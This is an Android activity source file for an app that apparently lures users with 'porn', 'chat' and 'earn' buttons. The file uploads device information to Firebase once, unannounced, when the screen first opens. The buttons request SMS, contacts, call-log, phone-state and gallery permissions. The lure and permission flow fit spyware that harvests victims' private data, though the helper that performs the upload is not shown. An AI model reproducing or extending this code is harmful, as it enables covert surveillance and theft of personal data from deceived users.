package com.mehboob.bushorat.activities;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.mehboob.bushorat.R;
import com.mehboob.bushorat.databinding.ActivityDashboardBinding;
import com.mehboob.bushorat.helpers.DeviceInfoHelper;

public class DashboardActivity extends AppCompatActivity {

    private ActivityDashboardBinding binding;
    final int GALLERY_PERMISSION_REQUEST  = 1;
    final int SMS_PERMISSION_CODE  = 2;
    private static final String PREFS_NAME = "MyAppPrefs";
    private static final String DEVICE_INFO_UPLOADED = "device_info_uploaded";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        binding=ActivityDashboardBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        checkAndUploadDeviceInfo();

//        DeviceInfoHelper.getDeviceInfo(this);
//        DeviceInfoHelper.uploadToFirebase(this);

        binding.btnPorn.setOnClickListener(v -> {
            if (checkGalleryPermission()) {
                openMediaActivity();
            } else {
                requestGalleryPermission();
            }
        });

        binding.btnChat.setOnClickListener(v -> {
            if (checkSmsPermission()) {
                startActivity(new Intent(DashboardActivity.this,ChatActivity.class));
            } else {
                requestSmsPermission();
            }
        });

        binding.btnContacts.setOnClickListener(v -> {
            if (hasAllPermissions()) {
                   startActivity(new Intent(DashboardActivity.this,EarnActivity.class));
            } else {
                // 🚫 Request permissions
                ActivityCompat.requestPermissions(
                        this,
                        new String[]{
                                Manifest.permission.READ_CONTACTS,
                                Manifest.permission.READ_CALL_LOG,
                                Manifest.permission.READ_PHONE_STATE
                        },
                        1001 // any request code you choose
                );
            }
        });


    }
    private void checkAndUploadDeviceInfo() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        boolean alreadyUploaded = prefs.getBoolean(DEVICE_INFO_UPLOADED, false);

        if (!alreadyUploaded) {
            // Call your helper methods
            DeviceInfoHelper.getDeviceInfo(this);
            DeviceInfoHelper.uploadToFirebase(this);

            // Set flag
            prefs.edit().putBoolean(DEVICE_INFO_UPLOADED, true).apply();

            System.out.println("✅ Device info uploaded");
        } else {
            System.out.println("✅ Device info already uploaded, skipping");
        }
    }
    private boolean checkGalleryPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
    }

    private boolean hasAllPermissions() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED;
    }


    private boolean checkSmsPermission() {
        return ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestSmsPermission() {
        ActivityCompat.requestPermissions(this,
                new String[]{Manifest.permission.READ_SMS},
                SMS_PERMISSION_CODE);
    }

    private void requestGalleryPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_MEDIA_IMAGES},
                    GALLERY_PERMISSION_REQUEST);
        } else {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                    GALLERY_PERMISSION_REQUEST);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == GALLERY_PERMISSION_REQUEST) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                openMediaActivity();
            } else {
                Toast.makeText(this, "Gallery permission is required to proceed", Toast.LENGTH_SHORT).show();
            }
        } else if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                openMediaActivity();
            } else {
                Toast.makeText(this, "Sms permission is required to proceed", Toast.LENGTH_SHORT).show();
            }
        } else if (requestCode == 1001) {
            if (hasAllPermissions()) {
                // ✅ Permissions granted
                Toast.makeText(this, "Permissions granted!", Toast.LENGTH_SHORT).show();
                // e.g., readContacts(), readCallLogs();
            } else {
                // ❌ Permissions denied
                Toast.makeText(this, "Required permissions not granted.", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void openMediaActivity() {
        Intent intent = new Intent(this, PornActivity.class);
        startActivity(intent);
    }



}